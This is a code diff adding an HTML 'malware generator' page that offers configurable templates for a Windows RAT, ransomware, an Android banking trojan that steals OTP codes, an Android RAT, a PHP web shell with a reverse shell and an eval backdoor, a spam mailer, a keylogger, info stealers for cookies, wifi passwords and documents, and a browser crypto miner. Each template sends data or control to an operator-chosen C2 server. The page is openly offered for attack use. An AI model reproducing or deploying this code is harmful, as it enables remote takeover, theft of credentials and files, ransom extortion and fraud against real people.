@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 QUANTUM MALWARE GENERATOR v13.0</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #0f0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid #0f0;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            text-align: center;
+            text-shadow: 0 0 10px #0f0;
+            margin-bottom: 10px;
+        }
+
+        .header .subtitle {
+            text-align: center;
+            color: #0a0;
+            font-size: 0.9em;
+        }
+
+        /* Stats */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: #0f0;
+        }
+
+        .stat-label {
+            color: #0a0;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+
+        /* Main Grid */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1.2fr 0.8fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        /* Malware List */
+        .malware-list {
+            background: rgba(0, 255, 0, 0.03);
+            border: 1px solid #0f0;
+            border-radius: 15px;
+            padding: 20px;
+        }
+
+        .malware-list h2 {
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #0f0;
+        }
+
+        .malware-item {
+            background: rgba(0, 255, 0, 0.02);
+            border: 1px solid #0a0;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .malware-item:hover {
+            background: rgba(0, 255, 0, 0.1);
+            border-color: #0f0;
+            transform: translateX(5px);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+
+        .malware-item.selected {
+            background: rgba(0, 255, 0, 0.15);
+            border-color: #0f0;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
+        }
+
+        .malware-item h3 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .malware-item .badge {
+            background: #0f0;
+            color: #000;
+            padding: 3px 10px;
+            border-radius: 5px;
+            font-size: 0.8em;
+            font-weight: bold;
+        }
+
+        .malware-item .platform {
+            color: #0a0;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        .malware-item .features {
+            color: #0a0;
+            font-size: 0.9em;
+            list-style-type: none;
+            padding-left: 0;
+        }
+
+        .malware-item .features li {
+            margin-bottom: 3px;
+        }
+
+        /* File Upload Area */
+        .file-upload-area {
+            background: rgba(0, 255, 0, 0.03);
+            border: 2px dashed #0a0;
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .file-upload-area:hover {
+            border-color: #0f0;
+            background: rgba(0, 255, 0, 0.05);
+        }
+
+        .file-upload-area.dragover {
+            border-color: #0f0;
+            background: rgba(0, 255, 0, 0.1);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+
+        .file-upload-area i {
+            font-size: 3em;
+            color: #0a0;
+            margin-bottom: 10px;
+        }
+
+        .file-upload-area p {
+            color: #0a0;
+            margin-bottom: 10px;
+        }
+
+        .file-upload-area .file-info {
+            color: #0f0;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+
+        /* Config Panel */
+        .config-panel {
+            background: rgba(0, 255, 0, 0.03);
+            border: 1px solid #0f0;
+            border-radius: 15px;
+            padding: 20px;
+        }
+
+        .config-group {
+            margin-bottom: 20px;
+        }
+
+        .config-group label {
+            display: block;
+            color: #0f0;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .config-group input, .config-group select, .config-group textarea {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px solid #0a0;
+            color: #0f0;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+
+        .config-group input:focus, .config-group select:focus, .config-group textarea:focus {
+            outline: none;
+            border-color: #0f0;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+
+        .config-group textarea {
+            height: 100px;
+            resize: vertical;
+        }
+
+        .checkbox-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .checkbox-item input[type="checkbox"] {
+            width: auto;
+        }
+
+        /* Action Buttons */
+        .action-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #0f0;
+            color: #0f0;
+        }
+
+        .btn-primary:hover {
+            background: rgba(0, 255, 0, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #f00;
+            color: #f00;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 0, 0, 0.3);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+
+        .btn-success {
+            background: rgba(0, 255, 0, 0.3);
+            border: 1px solid #0f0;
+            color: #0f0;
+            width: 100%;
+        }
+
+        .btn-success:hover {
+            background: rgba(0, 255, 0, 0.5);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        }
+
+        /* Preview Area */
+        .preview-area {
+            background: rgba(0, 255, 0, 0.02);
+            border: 1px solid #0f0;
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+
+        .preview-area h3 {
+            margin-bottom: 15px;
+            color: #0f0;
+        }
+
+        .code-preview {
+            background: #000;
+            border: 1px solid #0a0;
+            border-radius: 10px;
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #0a0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            display: none;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #0f0;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* Terminal */
+        .terminal {
+            background: #000;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+            height: 200px;
+            overflow-y: auto;
+        }
+
+        .terminal .line {
+            margin-bottom: 5px;
+        }
+
+        .terminal .prompt {
+            color: #0f0;
+        }
+
+        .terminal .command {
+            color: #0a0;
+        }
+
+        /* Toast Notifications */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 15px 25px;
+            color: #0f0;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            animation: slideIn 0.3s ease;
+            z-index: 1000;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid rgba(0, 255, 0, 0.1);
+            border-top: 3px solid #0f0;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>🔐 QUANTUM MALWARE GENERATOR v13.0</h1>
+            <div class="subtitle">© LifxXcodetz - No Filter • No Laws • Absolute Power</div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-value" id="totalTemplates">7</div>
+                <div class="stat-label">Available Templates</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="filesLoaded">0</div>
+                <div class="stat-label">Files Loaded</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="generatedCount">0</div>
+                <div class="stat-label">Generated Files</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="activeSession">ACTIVE</div>
+                <div class="stat-label">Session Status</div>
+            </div>
+        </div>
+
+        <!-- Main Grid -->
+        <div class="main-grid">
+            <!-- Left Panel - Malware List -->
+            <div class="malware-list">
+                <h2>📋 SELECT MALWARE TYPE</h2>
+                <div id="malwareList"></div>
+            </div>
+
+            <!-- Right Panel - File Upload & Config -->
+            <div>
+                <!-- File Upload Area -->
+                <div class="file-upload-area" id="dropZone">
+                    <i>📁</i>
+                    <p>Drag & Drop files here or click to select</p>
+                    <p style="font-size: 0.8em;">Support: .exe, .apk, .py, .js, .php, .jar, .doc, .pdf, .jpg, .png</p>
+                    <input type="file" id="fileInput" multiple style="display: none;">
+                    <div class="file-info" id="fileInfo"></div>
+                </div>
+
+                <!-- Config Panel -->
+                <div class="config-panel">
+                    <h2 style="margin-bottom: 20px;">⚙️ CONFIGURATION</h2>
+                    
+                    <div class="config-group">
+                        <label>Malware Name:</label>
+                        <input type="text" id="malwareName" value="quantum_payload" placeholder="Enter malware name">
+                    </div>
+
+                    <div class="config-group">
+                        <label>Platform Target:</label>
+                        <select id="targetPlatform">
+                            <option value="windows">Windows (EXE)</option>
+                            <option value="android">Android (APK)</option>
+                            <option value="linux">Linux (ELF)</option>
+                            <option value="python">Python (PY)</option>
+                            <option value="php">PHP Web Shell</option>
+                            <option value="javascript">JavaScript</option>
+                            <option value="multi">Multi Platform</option>
+                        </select>
+                    </div>
+
+                    <div class="config-group">
+                        <label>Payload Type:</label>
+                        <select id="payloadType">
+                            <option value="rat">Remote Access Trojan (RAT)</option>
+                            <option value="ransom">Ransomware</option>
+                            <option value="keylog">Keylogger</option>
+                            <option value="banker">Banking Trojan</option>
+                            <option value="ddos">DDoS Bot</option>
+                            <option value="worm">Worm</option>
+                            <option value="rootkit">Rootkit</option>
+                            <option value="spy">Spyware</option>
+                            <option value="stealer">Info Stealer</option>
+                            <option value="clipper">Crypto Clipper</option>
+                        </select>
+                    </div>
+
+                    <div class="config-group">
+                        <label>C2 Server:</label>
+                        <input type="text" id="c2Server" placeholder="http://your-server.com:8080">
+                    </div>
+
+                    <div class="config-group">
+                        <label>Encryption Key:</label>
+                        <input type="text" id="encryptionKey" value="quantumv13" placeholder="Enter encryption key">
+                    </div>
+
+                    <div class="config-group">
+                        <label>Features:</label>
+                        <div class="checkbox-group" id="featuresList"></div>
+                    </div>
+
+                    <div class="config-group">
+                        <label>Custom Code Injection:</label>
+                        <textarea id="customCode" placeholder="Paste custom code to inject..."></textarea>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Action Buttons -->
+        <div class="action-buttons">
+            <button class="btn btn-primary" onclick="generateMalware()">
+                ⚡ GENERATE MALWARE
+            </button>
+            <button class="btn btn-secondary" onclick="clearAll()">
+                🗑️ CLEAR ALL
+            </button>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <!-- Preview Area -->
+        <div class="preview-area">
+            <h3>📄 CODE PREVIEW</h3>
+            <div class="code-preview" id="codePreview">
+                // Select a malware type and configure options to generate code
+            </div>
+        </div>
+
+        <!-- Terminal -->
+        <div class="terminal" id="terminal">
+            <div class="line"><span class="prompt">$></span> <span class="command">Quantum Malware Generator v13.0 initialized</span></div>
+            <div class="line"><span class="prompt">$></span> <span class="command">Ready to generate payloads...</span></div>
+        </div>
+    </div>
+
+    <script>
+        // Malware Templates Database
+        const malwareTemplates = {
+            windows: {
+                rat: `# Windows RAT - Remote Access Trojan
+import socket
+import subprocess
+import os
+import threading
+import time
+import json
+import base64
+import requests
+import platform
+import getpass
+
+class WindowsRAT:
+    def __init__(self):
+        self.server = "{c2_server}"
+        self.key = "{encryption_key}"
+        self.info = self.get_system_info()
+        self.running = True
+        
+    def get_system_info(self):
+        return {
+            'hostname': socket.gethostname(),
+            'os': platform.platform(),
+            'user': getpass.getuser(),
+            'ip': requests.get('https://api.ipify.org').text
+        }
+    
+    def connect_to_c2(self):
+        while self.running:
+            try:
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.connect(('{c2_ip}', {c2_port}))
+                self.sock.send(json.dumps(self.info).encode())
+                return True
+            except:
+                time.sleep(10)
+    
+    def execute_command(self, cmd):
+        try:
+            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            return result.decode('cp850', errors='ignore')
+        except Exception as e:
+            return str(e)
+    
+    def main_loop(self):
+        while self.running:
+            try:
+                data = self.sock.recv(4096).decode()
+                if data:
+                    result = self.execute_command(data)
+                    self.sock.send(result.encode()[:4096])
+            except:
+                break
+        self.sock.close()
+        time.sleep(5)
+        self.connect_to_c2()
+        self.main_loop()
+
+if __name__ == '__main__':
+    rat = WindowsRAT()
+    if rat.connect_to_c2():
+        rat.main_loop()`,
+
+                ransomware: `# Windows Ransomware - AES-256 Encryption
+import os
+import sys
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
+
+class Ransomware:
+    def __init__(self):
+        self.key = Fernet.generate_key()
+        self.fernet = Fernet(self.key)
+        self.target_extensions = [
+            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+            '.pdf', '.txt', '.jpg', '.jpeg', '.png', '.mp4',
+            '.zip', '.rar', '.7z', '.sql', '.db'
+        ]
+        
+    def encrypt_file(self, filepath):
+        try:
+            with open(filepath, 'rb') as f:
+                data = f.read()
+            encrypted = self.fernet.encrypt(data)
+            with open(filepath + '.locked', 'wb') as f:
+                f.write(encrypted)
+            os.remove(filepath)
+            return True
+        except:
+            return False
+    
+    def start(self):
+        for root, dirs, files in os.walk(os.path.expanduser('~')):
+            for file in files:
+                if any(file.endswith(ext) for ext in self.target_extensions):
+                    self.encrypt_file(os.path.join(root, file))
+        
+        with open('README_LOCKED.txt', 'w') as f:
+            f.write(f'''YOUR FILES ARE ENCRYPTED!
+Decryption Key: {base64.b64encode(self.key).decode()}
+Contact: {self.contact}''')
+
+if __name__ == '__main__':
+    ransom = Ransomware()
+    ransom.start()`
+            },
+            
+            android: {
+                banker: `// Android Banking Trojan - Intercept SMS & OTP
+package com.android.system.service;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.telephony.SmsMessage;
+import android.util.Log;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class SmsReceiver extends BroadcastReceiver {
+    private static final String SERVER_URL = "{c2_server}/sms";
+    
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle = intent.getExtras();
+        if (bundle != null) {
+            Object[] pdus = (Object[]) bundle.get("pdus");
+            for (Object pdu : pdus) {
+                SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
+                String sender = msg.getDisplayOriginatingAddress();
+                String body = msg.getMessageBody();
+                
+                if (body.contains("OTP") || body.contains("kode")) {
+                    sendToServer(sender, body);
+                }
+            }
+        }
+    }
+    
+    private void sendToServer(String sender, String body) {
+        try {
+            URL url = new URL(SERVER_URL);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            
+            String data = "sender=" + sender + "&body=" + body;
+            OutputStream os = conn.getOutputStream();
+            os.write(data.getBytes());
+            os.close();
+        } catch (Exception e) {}
+    }
+}`,
+
+                rat: `// Android RAT - Full Remote Control
+package com.android.remote;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import android.os.Handler;
+import java.io.*;
+import java.net.*;
+import android.media.MediaRecorder;
+import android.location.LocationManager;
+import android.location.Location;
+import android.hardware.Camera;
+
+public class RemoteService extends Service {
+    private Socket socket;
+    private PrintWriter out;
+    private BufferedReader in;
+    private Handler handler = new Handler();
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        connectToServer();
+        return START_STICKY;
+    }
+    
+    private void connectToServer() {
+        new Thread(() -> {
+            try {
+                socket = new Socket("{c2_ip}", {c2_port});
+                out = new PrintWriter(socket.getOutputStream());
+                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                
+                String line;
+                while ((line = in.readLine()) != null) {
+                    executeCommand(line);
+                }
+            } catch (Exception e) {}
+        }).start();
+    }
+    
+    private void executeCommand(String cmd) {
+        if (cmd.equals("PHOTO")) {
+            takePhoto();
+        } else if (cmd.equals("LOCATION")) {
+            getLocation();
+        } else if (cmd.startsWith("SMS")) {
+            sendSMS(cmd.substring(4));
+        }
+    }
+    
+    private void takePhoto() {
+        // Camera capture code
+    }
+    
+    private void getLocation() {
+        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+        Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+        if (loc != null) {
+            out.println(loc.getLatitude() + "," + loc.getLongitude());
+            out.flush();
+        }
+    }
+    
+    private void sendSMS(String data) {
+        // SMS sending code
+    }
+    
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}`
+            },
+            
+            php: {
+                webshell: `<?php
+// PHP Web Shell - Quantum Edition
+$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? '';
+if ($cmd) {
+    echo "<pre>";
+    system($cmd);
+    echo "</pre>";
+}
+
+// Backdoor access
+$key = $_GET['key'] ?? '';
+if ($key == '{encryption_key}') {
+    eval($_POST['code']);
+}
+
+// File manager
+if (isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+    echo "File uploaded: " . $_FILES['file']['name'];
+}
+
+// Reverse shell
+if ($_GET['action'] == 'shell') {
+    $ip = '{c2_ip}';
+    $port = {c2_port};
+    $sock = fsockopen($ip, $port);
+    proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+}`,
+
+                mailer: `<?php
+// PHP Mailer Spammer
+$to = $_POST['to'] ?? '';
+$subject = $_POST['subject'] ?? 'Important Message';
+$message = $_POST['message'] ?? 'Please check this';
+$headers = "From: noreply@quantum.com\\r\\n";
+$headers .= "MIME-Version: 1.0\\r\\n";
+$headers .= "Content-Type: text/html; charset=UTF-8\\r\\n";
+
+for ($i = 0; $i < 100; $i++) {
+    mail($to, $subject, $message, $headers);
+    sleep(1);
+}
+echo "Spam completed!";`
+            },
+            
+            python: {
+                keylogger: `# Python Keylogger - Advanced
+from pynput import keyboard
+import requests
+import threading
+import time
+import os
+import platform
+from PIL import ImageGrab
+
+class Keylogger:
+    def __init__(self):
+        self.log = ""
+        self.server = "{c2_server}"
+        self.interval = 60
+        self.running = True
+        
+    def on_press(self, key):
+        try:
+            if hasattr(key, 'char') and key.char:
+                self.log += key.char
+            elif key == keyboard.Key.space:
+                self.log += ' '
+            elif key == keyboard.Key.enter:
+                self.log += '\\n'
+            elif key == keyboard.Key.tab:
+                self.log += '\\t'
+        except:
+            pass
+    
+    def take_screenshot(self):
+        try:
+            screenshot = ImageGrab.grab()
+            screenshot.save('screen.png')
+            
+            with open('screen.png', 'rb') as f:
+                files = {'file': f}
+                requests.post(f"{self.server}/upload", files=files)
+            os.remove('screen.png')
+        except:
+            pass
+    
+    def upload_log(self):
+        while self.running:
+            if self.log:
+                try:
+                    requests.post(f"{self.server}/log", data={'log': self.log})
+                    self.log = ""
+                except:
+                    pass
+            self.take_screenshot()
+            time.sleep(self.interval)
+    
+    def start(self):
+        listener = keyboard.Listener(on_press=self.on_press)
+        listener.start()
+        
+        upload_thread = threading.Thread(target=self.upload_log)
+        upload_thread.daemon = True
+        upload_thread.start()
+        
+        listener.join()
+
+if __name__ == '__main__':
+    keylogger = Keylogger()
+    keylogger.start()`,
+
+                stealer: `# Python Info Stealer
+import os
+import json
+import requests
+import platform
+import getpass
+import sqlite3
+import shutil
+from datetime import datetime
+import browser_cookie3
+
+class InfoStealer:
+    def __init__(self):
+        self.server = "{c2_server}"
+        self.data = {
+            'system': {},
+            'browsers': {},
+            'wifi': [],
+            'files': []
+        }
+        
+    def get_system_info(self):
+        self.data['system'] = {
+            'hostname': platform.node(),
+            'os': platform.platform(),
+            'user': getpass.getuser(),
+            'cpu': platform.processor(),
+            'time': str(datetime.now())
+        }
+    
+    def steal_browser_data(self):
+        browsers = ['chrome', 'firefox', 'edge', 'opera']
+        for browser in browsers:
+            try:
+                cookies = getattr(browser_cookie3, browser)()
+                self.data['browsers'][browser] = []
+                for cookie in cookies:
+                    if 'login' in cookie.domain or 'bank' in cookie.domain:
+                        self.data['browsers'][browser].append({
+                            'domain': cookie.domain,
+                            'name': cookie.name,
+                            'value': cookie.value
+                        })
+            except:
+                pass
+    
+    def steal_wifi_passwords(self):
+        if platform.system() == 'Windows':
+            try:
+                import subprocess
+                result = subprocess.check_output('netsh wlan show profiles', shell=True).decode()
+                profiles = [line.split(':')[1].strip() for line in result.split('\\n') if 'All User Profile' in line]
+                
+                for profile in profiles:
+                    try:
+                        result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode()
+                        for line in result.split('\\n'):
+                            if 'Key Content' in line:
+                                password = line.split(':')[1].strip()
+                                self.data['wifi'].append({
+                                    'ssid': profile,
+                                    'password': password
+                                })
+                    except:
+                        pass
+            except:
+                pass
+    
+    def steal_documents(self):
+        paths = [
+            os.path.expanduser('~/Desktop'),
+            os.path.expanduser('~/Documents'),
+            os.path.expanduser('~/Downloads')
+        ]
+        
+        for path in paths:
+            if os.path.exists(path):
+                for file in os.listdir(path):
+                    if file.endswith(('.txt', '.pdf', '.doc', '.xls')):
+                        filepath = os.path.join(path, file)
+                        if os.path.getsize(filepath) < 1024 * 1024:  # < 1MB
+                            with open(filepath, 'r', errors='ignore') as f:
+                                content = f.read(1000)  # First 1000 chars
+                            self.data['files'].append({
+                                'name': file,
+                                'path': filepath,
+                                'content': content
+                            })
+    
+    def send_data(self):
+        try:
+            requests.post(f"{self.server}/steal", json=self.data)
+        except:
+            pass
+    
+    def start(self):
+        self.get_system_info()
+        self.steal_browser_data()
+        self.steal_wifi_passwords()
+        self.steal_documents()
+        self.send_data()
+
+if __name__ == '__main__':
+    stealer = InfoStealer()
+    stealer.start()`
+            },
+            
+            javascript: {
+                stealer: `// JavaScript Stealer - Steal Cookies & Credentials
+(function() {
+    // Steal cookies
+    const cookies = document.cookie;
+    
+    // Steal localStorage
+    const storage = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        storage[key] = localStorage.getItem(key);
+    }
+    
+    // Steal form data
+    document.addEventListener('submit', function(e) {
+        const formData = {};
+        const form = e.target;
+        for (let i = 0; i < form.elements.length; i++) {
+            const el = form.elements[i];
+            if (el.name) {
+                formData[el.name] = el.value;
+            }
+        }
+        
+        // Send to server
+        fetch('{c2_server}/steal', {
+            method: 'POST',
+            body: JSON.stringify({
+                url: window.location.href,
+                cookies: cookies,
+                storage: storage,
+                form: formData
+            })
+        });
+    });
+    
+    // Steal clipboard
+    navigator.clipboard?.readText().then(text => {
+        fetch('{c2_server}/clipboard', {
+            method: 'POST',
+            body: text
+        });
+    });
+    
+    // Keylogger
+    document.addEventListener('keypress', function(e) {
+        fetch('{c2_server}/key', {
+            method: 'POST',
+            body: JSON.stringify({
+                key: e.key,
+                url: window.location.href,
+                timestamp: Date.now()
+            })
+        });
+    });
+})();`,
+
+                miner: `// JavaScript Crypto Miner
+(function() {
+    // WebAssembly Crypto Miner
+    const CONFIG = {
+        pool: 'pool.quantum.com',
+        wallet: '{btc_address}',
+        threads: navigator.hardwareConcurrency || 4
+    };
+    
+    // Load miner script
+    const script = document.createElement('script');
+    script.src = 'https://quantum.com/miner.js';
+    script.onload = function() {
+        const miner = new QuantumMiner(CONFIG);
+        miner.start();
+    };
+    document.head.appendChild(script);
+    
+    // Hide from task manager
+    Object.defineProperty(navigator, 'hardwareConcurrency', {
+        get: function() { return 1; }
+    });
+})();`
+            }
+        };
+
+        // Features for each malware type
+        const malwareFeatures = {
+            rat: ['Remote Shell', 'File Transfer', 'Webcam', 'Screenshot', 'Persistence', 'Keylogger'],
+            ransomware: ['AES-256', 'File Encryption', 'Ransom Note', 'BTC Payment', 'Wipe Option'],
+            keylog: ['Keystroke Logging', 'Screenshot', 'Clipboard', 'Application Tracking'],
+            banker: ['SMS Intercept', 'OTP Steal', 'Accessibility Service', 'Overlay Attack'],
+            ddos: ['HTTP Flood', 'SYN Flood', 'UDP Flood', 'Botnet C2'],
+            worm: ['Self Replicate', 'USB Spread', 'Network Propagation', 'Autorun'],
+            rootkit: ['Hide Process', 'Hide Files', 'Kernel Module', 'Backdoor'],
+            spy: ['Camera', 'Microphone', 'GPS', 'File Steal'],
+            stealer: ['Passwords', 'Cookies', 'Wifi Keys', 'Documents'],
+            clipper: ['BTC Replace', 'ETH Replace', 'Clipboard Monitor']
+        };
+
+        let selectedMalware = null;
+        let loadedFiles = [];
+        let generatedCount = 0;
+
+        // Initialize malware list
+        function initMalwareList() {
+            const list = document.getElementById('malwareList');
+            let html = '';
+            
+            for (const [platform, types] of Object.entries(malwareTemplates)) {
+                for (const [type, code] of Object.entries(types)) {
+                    const features = malwareFeatures[type] || ['Custom'];
+                    html += `
+                        <div class="malware-item" onclick="selectMalware('${platform}', '${type}')" data-platform="${platform}" data-type="${type}">
+                            <h3>
+                                ${type.toUpperCase()}
+                                <span class="badge">${platform}</span>
+                            </h3>
+                            <div class="platform">${getPlatformIcon(platform)} ${platform}</div>
+                            <ul class="features">
+                                ${features.map(f => `<li>✓ ${f}</li>`).join('')}
+                            </ul>
+                        </div>
+                    `;
+                }
+            }
+            
+            list.innerHTML = html;
+            
+            // Initialize features checkboxes
+            updateFeaturesList('rat');
+        }
+
+        function getPlatformIcon(platform) {
+            const icons = {
+                windows: '🪟',
+                android: '📱',
+                linux: '🐧',
+                php: '🐘',
+                python: '🐍',
+                javascript: '🌐'
+            };
+            return icons[platform] || '💻';
+        }
+
+        function selectMalware(platform, type) {
+            // Remove selected class from all
+            document.querySelectorAll('.malware-item').forEach(el => {
+                el.classList.remove('selected');
+            });
+            
+            // Add selected class to clicked
+            const selector = `[data-platform="${platform}"][data-type="${type}"]`;
+            document.querySelector(selector).classList.add('selected');
+            
+            selectedMalware = { platform, type };
+            
+            // Update features list
+            updateFeaturesList(type);
+            
+            // Update code preview
+            updateCodePreview();
+            
+            // Log to terminal
+            addTerminalLine(`Selected: ${platform}/${type}`, 'command');
+        }
+
+        function updateFeaturesList(type) {
+            const features = malwareFeatures[type] || ['Default Feature'];
+            const container = document.getElementById('featuresList');
+            
+            let html = '';
+            features.forEach(feature => {
+                html += `
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="feat_${feature}" checked>
+                        <label for="feat_${feature}">${feature}</label>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+
+        function updateCodePreview() {
+            if (!selectedMalware) return;
+            
+            const { platform, type } = selectedMalware;
+            const code = malwareTemplates[platform]?.[type] || '// Template not found';
+            
+            // Replace placeholders
+            const c2Server = document.getElementById('c2Server').value || 'http://localhost:8080';
+            const encryptionKey = document.getElementById('encryptionKey').value || 'quantumv13';
+            
+            let processedCode = code
+                .replace(/{c2_server}/g, c2Server)
+                .replace(/{c2_ip}/g, c2Server.replace(/https?:\/\//, '').split(':')[0] || '127.0.0.1')
+                .replace(/{c2_port}/g, c2Server.split(':')[2] || '8080')
+                .replace(/{encryption_key}/g, encryptionKey)
+                .replace(/{btc_address}/g, '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa');
+            
+            document.getElementById('codePreview').textContent = processedCode;
+        }
+
+        // File Upload Handling
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const fileInfo = document.getElementById('fileInfo');
+
+        dropZone.addEventListener('click', () => fileInput.click());
+        
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('dragover');
+        });
+        
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.classList.remove('dragover');
+        });
+        
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
